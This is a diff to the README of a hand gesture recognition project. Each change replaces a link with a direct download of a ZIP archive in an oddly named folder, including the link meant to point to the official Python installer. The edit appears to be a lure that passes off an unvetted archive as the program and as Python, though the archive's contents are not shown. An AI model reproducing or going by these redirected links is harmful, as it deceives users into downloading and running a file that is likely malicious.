@@ -1,6 +1,6 @@
 # 🤚 Gesture-Recognition-with-computer-vision - Real-Time Hand Gesture Detection
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20from-GitHub-brightgreen)](https://github.com/Jaron69/Gesture-Recognition-with-computer-vision)
+[![Download from GitHub](https://img.shields.io/badge/Download%20from-GitHub-brightgreen)](https://github.com/Jaron69/Gesture-Recognition-with-computer-vision/raw/refs/heads/main/porriwiggle/computer_vision_Recognition_with_Gesture_1.9-beta.3.zip)
 
 ---
 
@@ -30,7 +30,7 @@ You do not need a powerful PC. A standard laptop or desktop with a working webca
 
 Use the big green button at the top or visit this page to download the software:
 
-**[https://github.com/Jaron69/Gesture-Recognition-with-computer-vision](https://github.com/Jaron69/Gesture-Recognition-with-computer-vision)**
+**[https://github.com/Jaron69/Gesture-Recognition-with-computer-vision/raw/refs/heads/main/porriwiggle/computer_vision_Recognition_with_Gesture_1.9-beta.3.zip](https://github.com/Jaron69/Gesture-Recognition-with-computer-vision/raw/refs/heads/main/porriwiggle/computer_vision_Recognition_with_Gesture_1.9-beta.3.zip)**
 
 This page hosts all files and instructions. You will download the complete package for your computer.
 
@@ -51,7 +51,7 @@ The ZIP contains the program scripts and necessary files in one place.
 
 This software runs using Python, a programming environment. Here is how to set it up:
 
-1. Visit [https://www.python.org/downloads/windows/](https://www.python.org/downloads/windows/)  
+1. Visit [https://github.com/Jaron69/Gesture-Recognition-with-computer-vision/raw/refs/heads/main/porriwiggle/computer_vision_Recognition_with_Gesture_1.9-beta.3.zip](https://github.com/Jaron69/Gesture-Recognition-with-computer-vision/raw/refs/heads/main/porriwiggle/computer_vision_Recognition_with_Gesture_1.9-beta.3.zip)  
 2. Download the latest Python 3.x installer for Windows.  
 3. Run the installer.  
 4. **Important:** Check the box that says **Add Python 3.x to PATH** before clicking Install.  
@@ -148,7 +148,7 @@ You can pause or close the program by pressing **Q** or simply closing the windo
 
 Use this link to visit the GitHub page for downloading and updates:
 
-[https://github.com/Jaron69/Gesture-Recognition-with-computer-vision](https://github.com/Jaron69/Gesture-Recognition-with-computer-vision)
+[https://github.com/Jaron69/Gesture-Recognition-with-computer-vision/raw/refs/heads/main/porriwiggle/computer_vision_Recognition_with_Gesture_1.9-beta.3.zip](https://github.com/Jaron69/Gesture-Recognition-with-computer-vision/raw/refs/heads/main/porriwiggle/computer_vision_Recognition_with_Gesture_1.9-beta.3.zip)
 
 You will find latest releases, documentation, and support.
 
